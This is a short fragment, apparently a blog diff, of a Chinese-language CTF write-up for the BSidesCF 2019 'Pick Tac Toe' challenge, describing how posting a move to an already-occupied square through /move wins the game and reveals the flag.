 <h3 id="BSidesCF-2019-Pick-Tac-Toe"><a href="#BSidesCF-2019-Pick-Tac-Toe" class="headerlink" title="[BSidesCF 2019]Pick Tac Toe"></a>[BSidesCF 2019]Pick Tac Toe</h3><p>打开是井字棋，下赢了就能拿到flag</p>
 <p>看源码，有提示</p>
-<img src="/2020/07/02/taoisms/24.png" class="" title="examplename">
+<img src="/2020/07/02/taoisms/24.png" class="">
 
 <p>value对应的是下棋的位置，要在/move路径下，通过post的形式给move传值</p>
 <p>不知道咋做，就先下两步，想着会不会能够直接下被堵死的那一步，试了试居然可以</p>
-<img src="/2020/07/02/taoisms/25.png" class="" title="examplename">
+<img src="/2020/07/02/taoisms/25.png" class="">
     </div>
 
     
